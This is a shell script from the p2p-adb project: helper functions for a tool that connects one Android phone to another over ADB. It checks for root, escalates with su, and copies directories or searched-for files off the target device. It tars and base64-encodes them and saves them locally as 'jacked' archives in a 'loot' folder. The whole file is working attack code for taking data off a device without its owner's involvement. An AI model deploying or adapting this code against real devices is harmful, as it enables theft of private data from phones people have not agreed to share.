# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com


# random config stuff here


none="\033[0m"
bold="\033[1m"
red="\033[0;31m"


# Check to see if local /tmp/ exists (machine)
# Otherwise, default to /data/local/tmp/ (phone)

if [ -d /tmp/ ]
then
	TMP=/tmp/
else
	TMP=/data/local/tmp/
fi

# Just default to /data/local/tmp/
# As far as I know, it's available on all android versions
RTMP=/data/local/tmp/

# Let's just make sure ADB and busybox (or whatever) are available...

echo "Using: ${adb}"


if $adb version >/dev/null 2>/dev/null; then
	# good to go
	if busybox >/dev/null 2>/dev/null; then
		true
	elif [ $IGNOREBUSYBOX -eq 1 ]; then
		true
	else
		echo "${red}busybox is not in your \$PATH"
		echo "Install it from the play store!${none}"
		exit
	fi
else
	echo "${red}adb is not in your \$PATH"
	if [ $tryStaticADB -eq 1 ]; then
		echo "We will try static arm adb... Results may vary${none}"
	else
		echo "Add it to \$PATH, or enable \$tryStaticADB in run.sh ${none}"
		exit
	fi
fi


$adb kill-server
#either su, which helps afterwords for being root
#or just starting the server with root permissions, which would be: sudo adb start-server
su -c "${adb} start-server"

# ADB wrapper to easy root pain...
command(){
	echo "$*" > $TMP/p2p-tmp 

 	$adb push $TMP/p2p-tmp $RTMP/p2p-tmp 2>/dev/null

	if [ "$ISROOT" -eq "1" ]
	then
		$adb shell "su -c 'sh $RTMP/p2p-tmp'" | tr -d "\r"
	else
		$adb shell "sh $RTMP/p2p-tmp" | tr -d "\r"
	fi

	$adb shell "rm $RTMP/p2p-tmp" 2>/dev/null


}

# Check to see if a device is connected
isConnected(){

	# $LINECOUNT =
	# 2 if none
	# >2 if yes
	LINECOUNT=$($adb devices|wc -l)


	if [ $LINECOUNT -gt 2 ] 
	then
		echo "YES"
		return 0
	else
		echo "NO"
		return 1
	fi 
}


# Check to see if we're root on the device
isRoot(){
	WHOAMI=$($adb shell 'id' | tr -d "\r"  )
	TRYROOT=$($adb shell 'su -c "id"' | tr -d "\r" )

	if echo $WHOAMI | grep 'uid=0' 2>&1 >/dev/null 
	then
		[ $1 = 'info' ] && echo "Running as root" 
		[ $1 != 'info' ] && echo 0
	elif echo $TRYROOT | grep 'uid=0' 2>&1 >/dev/null
	then
		[ $1 = 'info' ] && echo "Not natively root." 
		[ $1 = 'info' ] && echo "Will continue to escalate with su." 
		[ $1 != 'info' ] && echo 1
	elif echo $WHOAMI | grep 'uid=2000' 2>&1 >/dev/null
	then
		[ $1 = 'info' ] && echo "Running as shell" 
		[ $1 != 'info' ] && echo 2
	else
		[ $1 = 'info' ] && echo "WHAT AM I???" 
		[ $1 != 'info' ] && echo 3
	fi
}


# Check the size of a directory or more
dataSize(){
	command "/data/local/tmp/busybox du -hc $*" | tail -n1
}


# Prepare to get the directory passed in the argument
getData(){
	DATAPATH="$*"
	echo "Calculating size of: $DATAPATH"
	SIZE=$(dataSize "$DATAPATH")
	echo "The size of $DATAPATH is: $SIZE"
	echo -n 'Continue? [Y/n] '
	read REPLY
	case "$REPLY" in
	 y|Y|'') getDataProto "$DATAPATH"  ;;
	 n|N) echo "Cancelling..." ;; 
	 *) echo "Cancelling..." ;;
	esac
}

# Actually get the file
getDataProto(){
	FILENAME=jacked_$(date +%s).tar
	SAUCEDIR=loot/
	mkdir $SAUCEDIR 2>/dev/null
	command "/data/local/tmp/busybox tar -cf - $* 2>/dev/null | /data/local/tmp/busybox base64 " | tr -d "\r" |  base64 -d > ${SAUCEDIR}/$FILENAME
	echo "The file has been saved as ${SAUCEDIR}/${FILENAME}"
}



# A more refined find function
getSearch(){
	DATAPATH="$1"
	FILE="$2"
	SIZE="$3"
	if [ -z "$FILE" ]; then
		FILE="*"
	fi
	if [ -z "$SIZE" ]; then
		SIZE="+0"
	fi
	echo "Searching for and calculating size of $DATAPATH - $FILE - $SIZE"
	FINALSIZE=$(size "$DATAPATH" "$FILE" "$SIZE" )
	echo "The size of $DATAPATH is: $FINALSIZE"
	echo -n 'Continue? [Y/n] ' 
	read REPLY
	case "$REPLY" in
	 y|Y|'') getSearchProto "$DATAPATH" "$FILE" "$SIZE"  ;;
	 n|N) echo "Cancelling..." ;; 
	 *) echo "Cancelling..." ;;
	esac
}


# Actually get the file
getSearchProto(){
	FILENAME=jacked_$(date +%s).tar
	command "/data/local/tmp/busybox find $1 -iname '$2' -type f -size $3 -exec tar -cf - {} \; 2>/dev/null | base64 " | tr -d "\r" | base64 -d > $FILENAME
	echo "The file has been saved as $FILENAME"
}

search(){
	command "/data/local/tmp/busybox find $1 -iname '$2' -type f -size $3 -exec ls {} \;"
}

size(){
	command "/data/local/tmp/busybox find $1 -iname \"$2\" -type f -size $3 -print0 | /data/local/tmp/busybox xargs -0 /data/local/tmp/busybox du -ch|tail -n1"
}


commandList=""
# function to manage dynamic loading of modules.
registerCommand(){
	c=$(echo $(echo $1|tr " " "_"))
	commandList=$commandList"@"$c
}

# Generate commands
generateCommands(){
	for i in $(echo $commandList|tr "@" "\n"  ); do
		$(echo $i|awk -F: {'print "export COMMAND"$1"="$2'})
	done
}

